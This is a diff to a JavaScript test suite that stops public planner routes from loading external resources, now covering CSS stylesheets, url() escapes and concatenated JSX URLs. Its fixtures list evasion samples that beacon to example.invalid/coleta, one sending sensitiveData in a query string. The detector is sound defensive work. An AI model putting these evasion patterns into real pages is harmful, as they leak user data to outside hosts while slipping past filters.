@@ -80,7 +80,7 @@ async function collectRouteSources(directory, relativeDirectory = "") {
       continue;
     }
 
-    if (entry.isFile() && /\.(?:ts|tsx)$/.test(entry.name)) {
+    if (entry.isFile() && /\.(?:css|ts|tsx)$/.test(entry.name)) {
       files.push({
         name: relativeName,
         source: await readFile(absoluteName, "utf8"),
@@ -558,6 +558,12 @@ function loadsExternalJsxResource(source) {
       const delimiter = tag[valueStart];
       let valueEnd = valueStart;
 
+      // Expressions can hide remote URLs behind concatenation, variables, or
+      // helper calls. Resource-bearing tags are static and local by contract.
+      if (delimiter === "{") {
+        return true;
+      }
+
       if (delimiter === '"' || delimiter === "'" || delimiter === "`") {
         valueEnd += 1;
         while (valueEnd < tag.length) {
@@ -609,7 +615,14 @@ function loadsExternalCssResource(source) {
   const externalUrl = /\burl\s*\(\s*["'`]?(?:https?:)?\/\//i;
 
   for (const match of analyzed.executable.matchAll(cssProperty)) {
-    if (externalUrl.test(analyzed.active.slice(match.index, match.index + 1000))) {
+    const declaration = analyzed.active
+      .slice(match.index, match.index + 1000)
+      .split(/[;,}]/, 1)[0];
+    if (
+      externalUrl.test(declaration) ||
+      (/\burl\s*\(/i.test(declaration) &&
+        (declaration.includes("+") || declaration.includes("\${")))
+    ) {
       return true;
     }
   }
@@ -621,6 +634,39 @@ function loadsExternalCssResource(source) {
       styleEnd === -1 ? undefined : styleEnd + "</style>".length,
     );
     if (externalUrl.test(candidate)) {
+      return true;
+    }
+  }
+
+  return false;
+}
+
+function loadsExternalCssStylesheet(source) {
+  const active = source.replace(/\/\*[\s\S]*?\*\//g, " ");
+
+  // CSS escapes can reconstruct protocols or url() identifiers. Supporting
+  // them safely needs a CSS parser, so this Node-native contract rejects them.
+  if (/\\(?:[0-9a-f]{1,6}\s?|.)/i.test(active)) {
+    return true;
+  }
+
+  const isLocalReference = (candidate) => {
+    const value = candidate.trim().replace(/^(["'])([\s\S]*)\1$/, "$2").trim();
+    return /^(?:\/(?!\/)|\.\.?\/|#|data:)/i.test(value);
+  };
+
+  for (const match of active.matchAll(/\burl\s*\(([^)]*)\)/gi)) {
+    if (!isLocalReference(match[1])) {
+      return true;
+    }
+  }
+
+  for (const match of active.matchAll(/@import\s+([^;{}]+)/gi)) {
+    const candidate = match[1].trim();
+    const imported =
+      candidate.match(/^url\s*\(([^)]*)\)/i)?.[1] ??
+      candidate.match(/^(["'][^"']*["'])/)?.[1];
+    if (!imported || !isLocalReference(imported)) {
       return true;
     }
   }
@@ -654,6 +700,13 @@ function assertNoExternalEffects(route, files) {
   ];
 
   for (const { name, source } of files) {
+    if (name.endsWith(".css")) {
+      if (loadsExternalCssStylesheet(source)) {
+        fail(route, `${name} não pode carregar recurso externo por CSS`);
+      }
+      continue;
+    }
+
     const analyzed = getSourceAnalysis(source);
     const views = {
       ...analyzed,
@@ -791,7 +844,7 @@ test("planejadores públicos reutilizam a fundação local segura", async (t) =>
     await t.test(route, async () => {
       const files = await readRouteSources(route);
 
-      if (files.length === 0) {
+      if (!files.some(({ name }) => /\.(?:ts|tsx)$/.test(name))) {
         fail(route, "não possui fonte TypeScript para validar");
       }
 
@@ -820,6 +873,10 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
     await writeFile(path.join(routeDirectory, "page.tsx"), "export default null;\n");
     await writeFile(path.join(nestedDirectory, "form.tsx"), "export const nested = true;\n");
     await writeFile(
+      path.join(nestedDirectory, "form.module.css"),
+      ".fixture { background: url('/marca.svg'); }\n",
+    );
+    await writeFile(
       path.join(groupedRouteDirectory, "page.tsx"),
       "export default null;\n",
     );
@@ -832,7 +889,7 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       (await readRouteSources("planejar-fixture", temporaryRoot)).map(
         ({ name }) => name,
       ),
-      ["components/form.tsx", "page.tsx"],
+      ["components/form.module.css", "components/form.tsx", "page.tsx"],
     );
     assert.equal(joinRelativeSourcePath("components", "form.tsx"), "components/form.tsx");
   } finally {
@@ -882,6 +939,8 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       '<img src="https://example.invalid/coleta" />',
       '<iframe src="//example.invalid/coleta" />',
       '<img src={"https://example.invalid/coleta"} />',
+      '<img src={"https:" + "/" + "/example.invalid/coleta"} />',
+      '<img src={assetPath} alt="" />',
       "<link href={condition ? '/local.css' : '//example.invalid/coleta.css'} />",
       "<img src={() => 'https://example.invalid/coleta'} />",
       "setTimeout('fetch(\\\"/api\\\")', 1);",
@@ -900,6 +959,7 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       "const identity = <T,>(arg: T) => fetch('/api');",
       "const identity = <T extends Record<string, unknown>>(arg: T): Promise<T> => fetch('/api');",
       "const style = { backgroundImage: `url('https://example.invalid/coleta?data=${sensitiveData}')` };",
+      "const style = { backgroundImage: 'url(' + 'https:' + '/' + '/example.invalid)' };",
       "ref.current?.click();",
       "formRef.current?.submit();",
       "const { click } = ref.current; click();",
@@ -932,7 +992,6 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       'const markupExample = \'<img src="https://example.invalid/coleta" />\';',
       '<a href="/eventos">Eventos</a>',
       '<img src="/marca.svg" alt="" />',
-      '<img src={assetPath} alt="" />',
       '<img src="/marca.svg" alt="Veja https://example.invalid" />',
       "import { helper } from './components/helper';",
       "import { LocalPlannerShell } from '@/components';",
@@ -955,6 +1014,32 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
         ]),
       );
     }
+
+    const stylesheetEvasions = [
+      ".hero { background-image: url('https://example.invalid/coleta'); }",
+      ".hero { background: url(//example.invalid/coleta); }",
+      "@import 'https://example.invalid/theme.css';",
+      ".hero { background: u\\72l('https://example.invalid/coleta'); }",
+    ];
+    for (const [index, source] of stylesheetEvasions.entries()) {
+      assert.throws(
+        () =>
+          assertNoExternalEffects("planejar-fixture", [
+            { name: `fixture-${index}.module.css`, source },
+          ]),
+        /planejar-fixture/,
+      );
+    }
+
+    assert.doesNotThrow(() =>
+      assertNoExternalEffects("planejar-fixture", [
+        {
+          name: "local.module.css",
+          source:
+            "/* https://example.invalid não é carregado */ .hero { background: url('/marca.svg'); } @import './tokens.css';",
+        },
+      ]),
+    );
 
     assert.doesNotThrow(() =>
       assertFoundationAccessibilitySources(
